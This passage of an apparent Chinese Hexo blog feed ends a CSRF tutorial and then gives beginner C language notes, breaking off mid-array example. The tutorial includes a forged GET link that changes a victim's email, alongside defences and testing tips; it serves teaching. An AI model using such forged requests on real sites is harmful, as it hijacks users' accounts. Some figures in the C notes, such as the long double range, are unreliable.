<p>如：/user.php?id=1&amp;email=123@163.com，这个链接的意思是用户id=1将邮箱修改为<a href="mailto:123@163.com">123@163.com</a>。当我们把这个链接修改为 /user.php?id=1&amp;email=abc@163.com ，然后通过各种手段发送给被攻击者，诱使被攻击者点击我们的链接，==当用户刚好在访问这个网站==，他同时又点击了这个链接，那么这个用户的邮箱被修改为<a href="mailto:abc@163.com">abc@163.com</a></p>
</blockquote>
<h3 id="2-POST型"><a href="#2-POST型" class="headerlink" title="2.POST型"></a>2.POST型</h3><ul>
<li>这类型的csrf利用起来通常是使用一个自动提交的表单</li>
<li>访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。</li>
</ul>
<blockquote>
<p>POST类型的攻击通常比GET要求更加严格一点，但仍并不复杂。任何个人网站、博客，被黑客上传页面的网站都有可能是发起攻击的来源，后端接口不能将安全寄托在仅允许POST上面。</p>
</blockquote>
<hr>
<h2 id="原理及过程"><a href="#原理及过程" class="headerlink" title="原理及过程"></a>原理及过程</h2><p>1.用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A</p>
<p>2.在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A</p>
<p>3.用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B</p>
<p>4.网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A</p>
<p>5.浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下==携带Cookie信息==，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。 </p>
<hr>
<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ol>
<li>验证HTTP Referer字段</li>
</ol>
<ul>
<li>根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。而如果黑客要对网站实施 CSRF 攻击，他只能在他自己的网站构造请求，该请求的 Referer 是指向黑客自己的网站。网站只需要对于每一个请求验证其 Referer 值如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。<blockquote>
<p>这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。</p>
</blockquote>
</li>
</ul>
<p>2.在请求地址中添加 token 并验证(Anti-CSRF token)</p>
<ul>
<li>CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下<font color="green">直接利用用户自己的 cookie 来通过安全验证。</font></li>
<li>要抵御 CSRF，关键在于在++请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中++。可以在 HTTP 请求中以参数的形式加入一个==随机产生的 token==，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。 <blockquote>
<p>token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。</p>
</blockquote>
</li>
</ul>
<p>3.在 HTTP 头中自定义属性并验证</p>
<ul>
<li>这种方法也是使用token并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到HTTP头中自定义的属性里。通过==XMLHttpRequest==这个类，可以一次性给所有该类请求加上 CSRFToken 这个 HTTP 头属性，并把 token 值放入其中。</li>
</ul>
<hr>
<h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>1：最简单的方法就是抓取一个正常请求的数据包，如果没有Referer字段和token，那么极有可能存在CSRF漏洞</p>
<p>2：如果有Referer字段，但是去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>代码审计</category>
        <category>漏洞挖掘</category>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WEB安全</tag>
        <tag>漏洞挖掘</tag>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言学习笔记</title>
    <url>/2019/10/26/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(1)/</url>
    <content><![CDATA[<h1 id="C语言学习笔记"><a href="#C语言学习笔记" class="headerlink" title="C语言学习笔记"></a>C语言学习笔记</h1><hr>
<p>[TOC]</p>
<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a><strong>数据类型</strong></h2><h3 id="1-基本类型"><a href="#1-基本类型" class="headerlink" title="1.基本类型"></a>1.基本类型</h3><ul>
<li>整数型：int、short int、long int、long long int<blockquote>
<p>short int ≤ int ≤ long int≤ long long int</p>
</blockquote>
</li>
<li>浮点型：float、double、long double</li>
<li>字符型：char</li>
<li>布尔型：_Bool</li>
<li>枚举型(不常用)：enum</li>
</ul>
<hr>
<h4 id="sizeof运算符"><a href="#sizeof运算符" class="headerlink" title="sizeof运算符"></a>sizeof运算符</h4><blockquote>
<ul>
<li>概念：sizeof运算符用于获得数据类型或表达式长度</li>
<li>用法：</li>
</ul>
</blockquote>
<pre class=" language-c"><code class="language-c"><span class="token keyword">sizeof</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//查看对象长度 等价于sizeof object;</span>
<span class="token keyword">sizeof</span><span class="token punctuation">(</span>type_name<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//查看数据类型</span></code></pre>
<hr>
<h4 id="类型限制符"><a href="#类型限制符" class="headerlink" title="类型限制符"></a>类型限制符</h4><blockquote>
<ul>
<li>signed：表示变量带符号位（可存放负数）</li>
<li>unsigned：表示变量不带符号位（不能存放负数，但意味着<font color="red">能存放更大的值</font>）</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>用法：<blockquote>
<ul>
<li>[signed] short [int]</li>
<li>unsigned short [int]</li>
<li>[signed] int</li>
<li>unsigned int</li>
<li>[signed] long [int]</li>
<li>unsigned long [int]</li>
<li>[signed] long long [int]</li>
<li>unsigned long long [int]</li>
</ul>
</blockquote>
</li>
</ul>
</blockquote>
<a id="more"></a>

<h3 id="2-指针类型"><a href="#2-指针类型" class="headerlink" title="2.指针类型"></a>2.指针类型</h3><h3 id="3-构造类型"><a href="#3-构造类型" class="headerlink" title="3.构造类型"></a>3.构造类型</h3><ul>
<li><p>数组类型</p>
</li>
<li><p>结构类型</p>
</li>
<li><p>联合类型</p>
</li>
</ul>
<h3 id="4-空类型"><a href="#4-空类型" class="headerlink" title="4.空类型"></a>4.空类型</h3><hr>
<hr>
<h2 id="取值范围"><a href="#取值范围" class="headerlink" title="取值范围"></a><strong>取值范围</strong></h2><h3 id="1-单位"><a href="#1-单位" class="headerlink" title="1.单位"></a>1.单位</h3><ul>
<li>比特位（bit）:CPU能读懂的最小单位</li>
<li>字节（Byte）：内存机构的最小寻址单位</li>
<li>换算：1 Byte == 8 bit</li>
</ul>
<hr>
<h3 id="2-进制换算"><a href="#2-进制换算" class="headerlink" title="2.进制换算"></a>2.进制换算</h3><table>
<thead>
<tr>
<th>二进制</th>
<th>十进制</th>
<th>十六进制</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>1</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>10</td>
<td>2</td>
<td>2</td>
</tr>
<tr>
<td>11</td>
<td>3</td>
<td>3</td>
</tr>
<tr>
<td>100</td>
<td>4</td>
<td>4</td>
</tr>
<tr>
<td>101</td>
<td>5</td>
<td>5</td>
</tr>
<tr>
<td>110</td>
<td>6</td>
<td>6</td>
</tr>
<tr>
<td>111</td>
<td>7</td>
<td>7</td>
</tr>
<tr>
<td>1000</td>
<td>8</td>
<td>8</td>
</tr>
<tr>
<td>1001</td>
<td>9</td>
<td>9</td>
</tr>
<tr>
<td>1010</td>
<td>10</td>
<td>A</td>
</tr>
<tr>
<td>1011</td>
<td>11</td>
<td>B</td>
</tr>
<tr>
<td>1100</td>
<td>12</td>
<td>C</td>
</tr>
<tr>
<td>1101</td>
<td>13</td>
<td>D</td>
</tr>
<tr>
<td>1110</td>
<td>14</td>
<td>E</td>
</tr>
<tr>
<td>1111</td>
<td>15</td>
<td>F</td>
</tr>
<tr>
<td>10000</td>
<td>16</td>
<td>10</td>
</tr>
<tr>
<td>10001</td>
<td>17</td>
<td>11</td>
</tr>
<tr>
<td>…</td>
<td>…</td>
<td>…</td>
</tr>
<tr>
<td>11111111</td>
<td>255</td>
<td>FF</td>
</tr>
</tbody></table>
<ul>
<li>十进制二进制转换：2的n次方减1</li>
</ul>
<hr>
<h3 id="3-符号位"><a href="#3-符号位" class="headerlink" title="3.符号位"></a>3.符号位</h3><ul>
<li><p>存放signed的类型的储存单元中，左边第一位表示符号位，如果该位为1就表示该数为负，如果该位为0就表示该数为正</p>
</li>
<li><p>一个32位的整形变量，除去左边第一个符号位，剩下表示的值只有31个比特位</p>
</li>
</ul>
<hr>
<h3 id="4-补码"><a href="#4-补码" class="headerlink" title="4.补码"></a>4.补码</h3><ul>
<li><p>正数的补码是该数的二进制形式</p>
</li>
<li><p>负数的补码通过几个步骤取得：</p>
<p>1.先取得该数的绝对值的二进制形式</p>
<p>2.将第一步的值按位取反（把1变为0，把0变成1）</p>
<p>3.将第二步的值加一</p>
</li>
</ul>
<hr>
<h3 id="5-基本数据类型的取值范围"><a href="#5-基本数据类型的取值范围" class="headerlink" title="5.基本数据类型的取值范围"></a>5.基本数据类型的取值范围</h3><table>
<thead>
<tr>
<th>数据类型</th>
<th>字节数</th>
<th>取值范围</th>
</tr>
</thead>
<tbody><tr>
<td>char</td>
<td>1</td>
<td>-128 ~ 127</td>
</tr>
<tr>
<td>unsigned char</td>
<td>1</td>
<td>0 ~ 255</td>
</tr>
<tr>
<td>short</td>
<td>2</td>
<td>-32768 ~ 32767</td>
</tr>
<tr>
<td>unsigned short</td>
<td>2</td>
<td>0 ~ 65535</td>
</tr>
<tr>
<td>int</td>
<td>4</td>
<td>-2147483648 ~ 2147483647</td>
</tr>
<tr>
<td>unsigned int</td>
<td>4</td>
<td>0 ~ 4294967295</td>
</tr>
<tr>
<td>long</td>
<td>4</td>
<td>-2147483648 ~ 2147483647</td>
</tr>
<tr>
<td>unsigned long</td>
<td>4</td>
<td>0 ~ 4294967295</td>
</tr>
<tr>
<td>long long</td>
<td>8</td>
<td>-9223372036854775808 ~ 9223372036854775807</td>
</tr>
<tr>
<td>unsigned long long</td>
<td>8</td>
<td>0 ~ 18446744073709551615</td>
</tr>
<tr>
<td>float</td>
<td>4</td>
<td>1.7549 * 10^-38 ~ 3.40282 * 10^38</td>
</tr>
<tr>
<td>double</td>
<td>8</td>
<td>2.22507 * 10^-308 ~ 1.79765 * 10^308</td>
</tr>
<tr>
<td>long double</td>
<td>12</td>
<td>2.22507 * 10^-308 ~ 1.79765 * 10^108</td>
</tr>
</tbody></table>
<hr>
<hr>
<h2 id="字符与字符串"><a href="#字符与字符串" class="headerlink" title="字符与字符串"></a><strong>字符与字符串</strong></h2><h3 id="1-ASCII表"><a href="#1-ASCII表" class="headerlink" title="1.ASCII表"></a>1.ASCII表</h3><p><img src="https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1538458003104&di=4b3f3ad99e68ea4b01f90fe5504ee854&imgtype=0&src=http%3A%2F%2Fimg.bimg.126.net%2Fphoto%2FnjtcLwoNWZ51joclAWjzKw%3D%3D%2F308215099515025170.jpg" alt></p>
<h3 id="2-字符串"><a href="#2-字符串" class="headerlink" title="2.字符串"></a>2.字符串</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> 变量名<span class="token punctuation">[</span>数量<span class="token punctuation">]</span><span class="token punctuation">;</span>

变量名<span class="token punctuation">[</span>索引号<span class="token punctuation">]</span> <span class="token operator">=</span> 字符<span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">//声明字符串</span>
<span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">//给字符串赋值</span>
name<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'N'</span><span class="token punctuation">;</span>
name<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'i'</span><span class="token punctuation">;</span>
name<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'n'</span><span class="token punctuation">;</span>
name<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'e'</span><span class="token punctuation">;</span>
name<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'K'</span><span class="token punctuation">;</span></code></pre>
<ul>
<li>注意在末尾添加\0 , 否则会出现乱码</li>
</ul>
<hr>
<hr>
<h2 id="字符与字符串-1"><a href="#字符与字符串-1" class="headerlink" title="字符与字符串"></a><strong>字符与字符串</strong></h2><h3 id="运算符："><a href="#运算符：" class="headerlink" title="运算符："></a>运算符：</h3><ul>
<li>C语言通过提供运算符来支持我们对数据的处理</li>
</ul>
<h4 id="1-算术运算符"><a href="#1-算术运算符" class="headerlink" title="1.算术运算符:"></a>1.算术运算符:</h4><p><img src="https://fishc.com.cn/forum.php?mod=image&aid=41750&size=400x300&key=3d2c5badf61607a4&type=1" alt></p>
<ul>
<li>目：操作数的个数</li>
<li>表达式：用运算符和括号将操作数连接起来的式子<br>比如：1 + 1、a + b</li>
</ul>
<ul>
<li>类型转换：<br>(数据类型)值</li>
</ul>
<hr>
<h4 id="2-关系运算符"><a href="#2-关系运算符" class="headerlink" title="2.关系运算符"></a>2.关系运算符</h4><ul>
<li>使用关系运算符来比较两个数的大小关系</li>
</ul>
<p><img src="https://fishc.com.cn/forum.php?mod=image&aid=41978&size=400x300&key=879f47f9d6645672&type=1" alt></p>
<ul>
<li>关系表达式：用关系运算符将两边的变量、数据或表达式连接起来，称之为关系表达式</li>
</ul>
<blockquote>
<p>如：1&lt;2、a&gt;b、(a=3) &gt; (b=5)</p>
</blockquote>
<blockquote>
<p>关系表达式得到的值是一个逻辑值，即判断结果为“真”或“假”，如果结果为“真”，关系表达式的值为 1，如果为“假”，关系表达式的值则为 0。</p>
</blockquote>
<hr>
<h4 id="3-逻辑运算符"><a href="#3-逻辑运算符" class="headerlink" title="3..逻辑运算符"></a>3..逻辑运算符</h4><ul>
<li><p>C语言总共提供了三种逻辑运算符：<br><img src="https://fishc.com.cn/forum.php?mod=image&aid=41969&size=400x300&key=c0bbd69ffca9fa16&type=1" alt></p>
</li>
<li><p>逻辑表达式：用逻辑运算符将两边的变量、数据或表达式连接起来，称之为逻辑表达式</p>
</li>
</ul>
<blockquote>
<p>如:3 &gt; 1 &amp;&amp; 1 &lt; 2</p>
</blockquote>
<ul>
<li><font color="red">注：关系表达式和逻辑表达式得到的值都是一个逻辑值，也就是表示真的 1 和表示假的 0。但是用于判断一个值是否为真时，以 0 表示假，以任何非 0 的数表示真。一个是编译系统告诉我们的结果，一个是我们让编译系统去判断的，两者方向不同。</font></li>
</ul>
<h4 id="4-运算符的优先级和结合性："><a href="#4-运算符的优先级和结合性：" class="headerlink" title="4.运算符的优先级和结合性："></a>4.运算符的优先级和结合性：</h4><p><img src="https://ss0.bdstatic.com/70cFuHSh_Q1YnxGkpoWK1HF6hhy/it/u=1011419353,2642700465&fm=26&gp=0.jpg" alt="image"></p>
<h4 id="5-短路求值"><a href="#5-短路求值" class="headerlink" title="5.短路求值"></a>5.短路求值</h4><ul>
<li><p>短路求值又称最小化求值，是一种逻辑运算符的求值策略。只有当第一个运算数的值无法确定逻辑运算的结果时，才对第二个运算数进行求值。</p>
</li>
<li><p>C 语言对于逻辑与和逻辑或采用短路求值的方式。</p>
</li>
</ul>
<ul>
<li>例如：<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
</code></pre>
</li>
</ul>
<p>int main()<br>{<br>        int a = 3, b = 3;</p>
<pre><code>    (a = 0) &amp;&amp; (b = 5);
    printf(&quot;a = %d, b = %d\n&quot;, a, b);

    (a = 1) || (b = 5);
    printf(&quot;a = %d, b = %d\n&quot;, a, b);

    return 0;</code></pre><p>}</p>
<pre><code>结果为：![](https://fishc.com.cn/forum.php?mod=image&amp;aid=41970&amp;size=400x300&amp;key=3d6e6c06c1d0cd8f&amp;type=1)

***
***

## **if语句**
### 语句1
```c
if(表达式){
    ...   //逻辑值为真所执行的语句或程序块
}</code></pre><hr>
<h3 id="语句2"><a href="#语句2" class="headerlink" title="语句2"></a>语句2</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>表达式<span class="token number">1</span><span class="token punctuation">)</span> 
<span class="token punctuation">{</span>
    …… <span class="token comment" spellcheck="true">// 逻辑值为真所执行的语句、程序块</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>表达式<span class="token number">2</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    …… <span class="token comment" spellcheck="true">// 逻辑值为真所执行的语句、程序块</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>表达式<span class="token number">3</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    …… <span class="token comment" spellcheck="true">// 逻辑值为真所执行的语句、程序块</span>
<span class="token punctuation">}</span></code></pre>
<hr>
<hr>
<h2 id="switch语句与分支嵌套"><a href="#switch语句与分支嵌套" class="headerlink" title="switch语句与分支嵌套"></a><strong>switch语句与分支嵌套</strong></h2><h3 id="1-switch语句"><a href="#1-switch语句" class="headerlink" title="1.switch语句"></a>1.switch语句</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">switch</span> <span class="token punctuation">(</span>表达式<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">case</span> 常量表达式<span class="token number">1</span><span class="token punctuation">:</span> 语句或程序块
    <span class="token keyword">case</span> 常量表达式<span class="token number">2</span><span class="token punctuation">:</span> 语句或程序块
    ……
    <span class="token keyword">case</span> 常量表达式n：语句或程序块
    <span class="token keyword">default</span><span class="token punctuation">:</span> 语句或程序块 
<span class="token punctuation">}</span></code></pre>
<ul>
<li>这里每个 case 后边的常量是匹配 switch 后边表达式的值</li>
<li>case 后边必须跟一个常量值，而不能是一个范围</li>
<li>如果所有的 case 均没有匹配的，那么执行 default 的内容</li>
<li>default 是可选的，如果没有 default，并且所有的 case 均不匹配，那么 switch 语句不执行任何动作</li>
</ul>
<hr>
<h3 id="2-使用-break-语句跳出"><a href="#2-使用-break-语句跳出" class="headerlink" title="2. 使用 break 语句跳出"></a>2. 使用 break 语句跳出</h3><ul>
<li>switch 语句中的 case 和 default 事实上都是“标签”，用来标志一个位置而已。</li>
<li>当 switch 跳到某个位置之后，就会一直往下执行，所以我们这里还需要配合一个 break 语句，让代码在适当的位置跳出 switch。</li>
</ul>
<hr>
<h3 id="3-分支结构的嵌套"><a href="#3-分支结构的嵌套" class="headerlink" title="3. 分支结构的嵌套"></a>3. 分支结构的嵌套</h3><ul>
<li>如果在一个 if 语句中包含另一个 if 语句，我们就称之为 if 语句的嵌套，也叫分支结构的嵌套。<br><img src="https://fishc.com.cn/forum.php?mod=image&aid=42523&size=400x300&key=0c6b31924edebe20&type=1" alt></li>
</ul>
<hr>
<h3 id="4-else悬挂"><a href="#4-else悬挂" class="headerlink" title="4.else悬挂"></a>4.else悬挂</h3><ul>
<li>C 语言中有这样的规则，else 始终与同一对括号内最近的未匹配的 if 结合。</li>
</ul>
<hr>
<h3 id="5-等于号带来的问题"><a href="#5-等于号带来的问题" class="headerlink" title="5. 等于号带来的问题"></a>5. 等于号带来的问题</h3><ul>
<li><p>在 C 语言中使用等号（=）作为赋值运算，使用连续两个等号（==）作为比较运算。一般而言，赋值运算相对于比较运算出现得更频繁，因此字符较少的 = 就被赋予了更常用的含义——赋值操作。</p>
</li>
<li><p>此外，在 C 语言中赋值符号被作为一种操作符对待，因而重复进行赋值操作（如 a = b = c）可以很容易地书写，并且赋值操作还可以被嵌入到更大的表达式中。</p>
</li>
<li><p>但是，这种使用上的便利性可能导致一个潜在的问题：当程序员本意是在作比较运算时，却可能无意中误写成赋值运算</p>
</li>
</ul>
<hr>
<hr>
<h2 id="while语句与do-while语句"><a href="#while语句与do-while语句" class="headerlink" title="while语句与do while语句"></a><strong>while语句与do while语句</strong></h2><h3 id="1-循环结构"><a href="#1-循环结构" class="headerlink" title="1.循环结构"></a>1.循环结构</h3><ul>
<li>当我们需要重复执行同一段代码很多次的时候，就可以使用循环结构来解决。</li>
</ul>
<hr>
<h3 id="2-while语句"><a href="#2-while语句" class="headerlink" title="2.while语句"></a>2.while语句</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">while</span> <span class="token punctuation">(</span>表达式<span class="token punctuation">)</span>
    循环体</code></pre>
<ul>
<li>while 语句的语法非常简单，只要表达式的值为真，那么就会不断执行循环体里边的语句或程序块。<br><img src="https://fishc.com.cn/forum.php?mod=image&aid=42690&size=400x300&key=25005d39fc536b73&type=1" alt></li>
</ul>
<hr>
<h3 id="3-do-while-语句"><a href="#3-do-while-语句" class="headerlink" title="3.do while 语句"></a>3.do while 语句</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">do</span>
    循环体
<span class="token keyword">while</span> <span class="token punctuation">(</span>表达式<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<ul>
<li><p>while 是先判断表达式，如果表达式结果为真，才执行循环体里边的内容；</p>
</li>
<li><p>而 do…while 则相反，先执行循环体的内容再判断表达式是否为真。</p>
</li>
</ul>
<p><img src="https://fishc.com.cn/forum.php?mod=image&aid=42691&size=400x300&key=de54871239f4aafb&type=1" alt></p>
<ul>
<li><font color="red">注意：do…while 语句在 while 后边一定要用分号（;）表示语句结束。</font></li>
</ul>
<hr>
<hr>
<h2 id="for语句与循环嵌套"><a href="#for语句与循环嵌套" class="headerlink" title="for语句与循环嵌套"></a><strong>for语句与循环嵌套</strong></h2><h3 id="1-循环三要点"><a href="#1-循环三要点" class="headerlink" title="1.循环三要点"></a>1.循环三要点</h3><ul>
<li>初始化计数器</li>
<li>判断循环条件是否满足</li>
<li>更新计数器</li>
</ul>
<hr>
<h3 id="2-for语句"><a href="#2-for语句" class="headerlink" title="2.for语句"></a>2.for语句</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span>表达式<span class="token number">1</span><span class="token punctuation">;</span> 表达式<span class="token number">2</span><span class="token punctuation">;</span> 表达式<span class="token number">3</span><span class="token punctuation">)</span>
        循环体</code></pre>
<ul>
<li>三个表达式用分号隔开，其中：</li>
</ul>
<blockquote>
<p>表达式1是循环初始化表达式</p>
</blockquote>
<blockquote>
<p>表达式2是循环条件表达式</p>
</blockquote>
<blockquote>
<p>表达式3是循环调整表达式</p>
</blockquote>
<ul>
<li>特点：</li>
</ul>
<p>for 语句的表达式1，表达式2和表达式3都可以按照需要进行省略（但分号不能省）：</p>
<blockquote>
<p>for ( ; 表达式2; 表达式3)</p>
</blockquote>
<blockquote>
<p>for (表达式1; 表达式2; )</p>
</blockquote>
<blockquote>
<p>for (表达式1; ; )</p>
</blockquote>
<blockquote>
<p>for ( ; ; )</p>
</blockquote>
<blockquote>
<p>……</p>
</blockquote>
<ul>
<li><font color="red">注意：如果目的不是特别明确，建议不要这么做，因为程序的可读性会因此而降低！</font></li>
</ul>
<hr>
<h3 id="3-循环嵌套"><a href="#3-循环嵌套" class="headerlink" title="3. 循环嵌套"></a>3. 循环嵌套</h3><ul>
<li><p>循环结构跟分支结构一样，都可以实现嵌套。</p>
</li>
<li><p>对于嵌套的循环结构，执行顺序是从内到外：先执行内层循环，再执行外层循环。</p>
</li>
</ul>
<hr>
<hr>
<h2 id="break语句和continue语句"><a href="#break语句和continue语句" class="headerlink" title="break语句和continue语句"></a><strong>break语句和continue语句</strong></h2><h3 id="1-break-语句"><a href="#1-break-语句" class="headerlink" title="1.break 语句"></a>1.break 语句</h3><ul>
<li><p>在循环体中，如果我们想要让程序在中途跳出循环，那么我们同样可以使用 break 语句来实现。</p>
</li>
<li><p>执行 break 语句，直接跳出循环体。</p>
</li>
<li><p><font color="red">对于嵌套循环来说，break 语句只负责跳出所在的那一层循环，要跳出外层循环则需要再布置一个 break 语句才行。</font></p>
</li>
</ul>
<hr>
<h3 id="2-continue语句"><a href="#2-continue语句" class="headerlink" title="2.continue语句"></a>2.continue语句</h3><ul>
<li><p>当满足某个条件的时候，跳过本轮循环的内容，直接开始下一轮循环。这时候我们应该使用 continue 语句。</p>
</li>
<li><p>当执行到 continue 语句的时候，循环体的剩余部分将被忽略，直接进入下一轮循环。</p>
</li>
<li><p>对于嵌套循环来说，continue 语句跟 break 语句是一样的：它们都只能作用于一层循环体。</p>
</li>
</ul>
<hr>
<h3 id="3-for-语句和-while-语句执行过程的区别"><a href="#3-for-语句和-while-语句执行过程的区别" class="headerlink" title="3. for 语句和 while 语句执行过程的区别"></a>3. for 语句和 while 语句执行过程的区别</h3><ul>
<li><p>for 语句和 while语句执行过程是有区别的，它们的区别在于出现 continue 语句时。</p>
</li>
<li><p>在 for 语句中，continue语句跳过循环的剩余部分，直接回到调整部分。</p>
</li>
<li><p>在 while 语句中，调整部分是循环体的一部分，因此 continue 语句会把它也跳过。</p>
</li>
</ul>
<hr>
<hr>
<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a><strong>数组</strong></h2><h3 id="1-数组的含义"><a href="#1-数组的含义" class="headerlink" title="1.数组的含义"></a>1.数组的含义</h3><ul>
<li>数组是储存同类型数据的地方</li>
</ul>
<h3 id="2-定义数组"><a href="#2-定义数组" class="headerlink" title="2.定义数组"></a>2.定义数组</h3><ul>
<li>类型 数组名[常量表达式] 例如：<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">double</span> b<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre>
</li>
</ul>
<h3 id="3-访问"><a href="#3-访问" class="headerlink" title="3.访问"></a>3.访问</h3><ul>
<li><p>数组名[下标]</p>
<pre class=" language-c"><code class="language-c">a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
b<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre>
</li>
<li><p><font color="red">第一个元素的下标是0而不是1</font></p>
</li>
</ul>
<h3 id="4-数组的初始化"><a href="#4-数组的初始化" class="headerlink" title="4.数组的初始化"></a>4.数组的初始化</h3><ul>
<li><p>在定义数组的同时对其各个元素进行赋值，称之为数组的初始化</p>
</li>
<li><p>第一种：将所有元素统一初始化为某个值</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">9</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
</li>
<li><p>第二种：赋不同值，用逗号隔开</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
</li>
<li><p>第三种：只给一部分赋值，其余自动初始化为0</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 表示为前边 6 个元素赋值，后边 4 个元素系统自动初始化为 0</span></code></pre>
</li>
<li><p>第四种：可以只给出各个元素的值，而不指定数组的长度</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span 